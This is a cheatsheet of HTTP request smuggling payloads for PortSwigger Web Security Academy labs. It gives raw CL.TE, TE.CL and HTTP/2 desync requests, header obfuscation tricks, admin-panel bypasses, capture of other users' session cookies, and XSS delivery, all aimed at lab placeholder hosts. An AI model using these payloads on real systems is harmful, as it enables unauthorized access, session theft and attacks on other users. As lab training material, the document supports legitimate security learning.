# 🚀 HTTP Request Smuggling Cheatsheet

Complete exploitation methodologies, HTTP/1.1 and HTTP/2 desynchronization vectors, and payload construction for Request Smuggling labs in PortSwigger Web Security Academy.

---

## 📌 4-Step Methodology & Detection Workflows

### 1. Initial Setup & Burp Repeater Prep
1. **Pick an Endpoint:** Locate the root page `/` or any main POST endpoint.
2. **Downgrade Protocol:** Ensure the request uses `HTTP/1.1` in Repeater.
3. **Change Request Method:** Convert request to `POST`.
4. **Disable Auto Content-Length:** Uncheck **"Update Content-Length"** in Burp Repeater options.
5. **Show Non-Printable Characters:** Enable `\r\n` visibility to ensure accurate chunk formatting.

---

### 2. Detection Decision Tree

#### Probe 1: Testing for CL.TE Vulnerability
Send a request with `Content-Length` shorter than the full chunked body, leaving an incomplete chunk for the back-end:

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
3\r\n
abc\r\n
X\r\n</code></pre>

* **Response (Immediate) ->** `CL.CL` (or non-vulnerable)
* **Reject (Front-end) ->** `TE.CL` or `TE.TE`
* **Timeout (Back-end waits for missing data) ->** **CL.TE VULNERABLE** 🎯

---

#### Probe 2: Testing for TE.CL Vulnerability
Send a request where the front-end reads `Transfer-Encoding: chunked` and sees a terminal `0` chunk, but the back-end uses `Content-Length`:

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
X</code></pre>

* **Response (Immediate) ->** `CL.CL` or `TE.TE`
* **Timeout (Back-end waits for Content-Length bytes) ->** **TE.CL VULNERABLE** 🎯
* **Socket Poison (Back-end) ->** **CL.TE VULNERABLE**

---

## 🛠️ Detailed Breakdown & Lab Payloads

### 1. Basic HTTP/1.1 Desync Flaws

#### Basic CL.TE Vulnerability
Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 13
Transfer-Encoding: chunked
\r\n
0\r\n
\r\n
G</code></pre>

*(Follow-up request will receive `GGET / HTTP/1.1` -> `405 Method Not Allowed` or `404`)*

#### Basic TE.CL Vulnerability
Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
\r\n
8\r\n
INVALID\r\n
0\r\n
\r\n</code></pre>

#### Obfuscating the TE Header (TE.TE)
Bypass front-end TE filters using header variations:

<pre><code>Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x</code></pre>

---

### 2. Differential Responses & Exploitation

#### Confirming Vulnerabilities via Differential Responses
* **CL.TE:** Smuggle `GET /404 HTTP/1.1\r\nFoo: x` to append to the next user's request.
* **TE.CL:** Smuggle `GET /404 HTTP/1.1\r\nHost: target\r\n\r\n` into the back-end socket buffer.

#### Bypassing Front-end Security Controls
* **CL.TE / TE.CL:** Smuggle administrative requests directly to back-end endpoints:

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1
Foo: x</code></pre>

#### Revealing Front-end Request Rewriting
Smuggle a request to a search or comment form to reflect hidden proxy headers (e.g., `X-Forwarded-For`, `X-Client-IP`):

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 120
Transfer-Encoding: chunked

0\r\n
\r\n
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=test</code></pre>

#### Capturing Other Users' Requests
Smuggle a request where the parameter body stays open, appending the next victim's request (including cookies/tokens) into the body:

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 250
Transfer-Encoding: chunked

0\r\n
\r\n
POST /post/comment HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 400
Cookie: session=YOUR-SESSION

comment=stolen_data:</code></pre>

#### Delivering Reflected XSS
Smuggle a request pointing to a Reflected XSS endpoint so the next unsuspecting user executes the payload:

<pre><code>POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 150
Transfer-Encoding: chunked

0\r\n
\r\n
GET /post?postId=5<script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Foo: x</code></pre>

#### Web Cache Poisoning & Web Cache Deception
* **Cache Poisoning:** Smuggle an `X-Forwarded-Host` or malicious path request to poison cached static resources.
* **Cache Deception:** Smuggle a request to fetch victim private data while tricking the cache into indexing it under a static extension (`/account/data.js`).

---

### 3. Advanced HTTP/2 & Desync Variants

#### H2.CL Request Smuggling
HTTP/2 front-end translates to HTTP/1.1 back-end, injecting an explicit `content-length` header:

<pre><code>:method: POST
:path: /
:authority: YOUR-LAB-ID.web-security-academy.net
content-length: 0

GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net</code></pre>

#### Response Queue Poisoning via H2.TE
Desynchronize response streams so users receive responses intended for other clients:

<pre><code>:method: POST
:path: /
:authority: YOUR-LAB-ID.web-security-academy.net
transfer-encoding: chunked

0\r\n
\r\n
GET /404 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net</code></pre>

#### HTTP/2 Request Smuggling & Splitting via CRLF Injection
Inject `\r\n` into H2 header names/values:
* **CRLF Smuggling:** Header `Foo: bar\r\n\r\nPOST /admin HTTP/1.1`
* **CRLF Splitting:** Header `foo: bar\r\nHTTP/1.1 200 OK\r\n...`

#### Bypassing Access Controls & Cache Poisoning via H2 Request Tunnelling
Tunnel complete nested HTTP requests inside an H2 header field (e.g., `foo: bar\r\n\r\nGET /admin HTTP/1.1...`) across persistent HTTP/2 connections.

#### 0.CL & CL.0 Request Smuggling
* **0.CL:** Front-end sends `Content-Length: 0`, but back-end reads body content.
* **CL.0:** Front-end sends `Content-Length: N`, back-end completely ignores body (`Content-Length: 0` assumption on endpoints like GET/HEAD).

#### Client-Side Desync (CSD)
Trick the victim's browser into desynchronizing its connection to a reverse proxy via missing `Content-Length` or connection reuse discrepancies.

#### Server-Side Pause-Based Request Smuggling
Send request headers and pause execution mid-stream (using Turbo Intruder or custom scripts) to force back-end timeouts/desyncs.

---

## 🗄️ HTTP Request Smuggling Quick Reference

| Flaw Type | Front-End Parsing | Back-End Parsing | Primary Detection Vector |
| :--- | :--- | :--- | :--- |
| **CL.TE** | Content-Length | Transfer-Encoding | `Content-Length: 6` + incomplete chunk -> Timeout |
| **TE.CL** | Transfer-Encoding | Content-Length | `0\r\n\r\nX` chunk -> Timeout |
| **TE.TE** | Obfuscated TE accepted | TE ignored / fallback to CL | Header obfuscation (`Transfer-Encoding : chunked`) |
| **H2.CL** | H2 frame length | Content-Length | H2 request with explicit `content-length: 0` header |
| **H2.TE** | H2 frame length | Transfer-Encoding | H2 request with `transfer-encoding: chunked` header |
| **CL.0** | Content-Length | Ignores Content-Length | Request body processed as start of next request |
| **H2 Tunnelling** | H2 header pass-through | Header CRLF expanded | `\r\n\r\n` inside H2 header field |
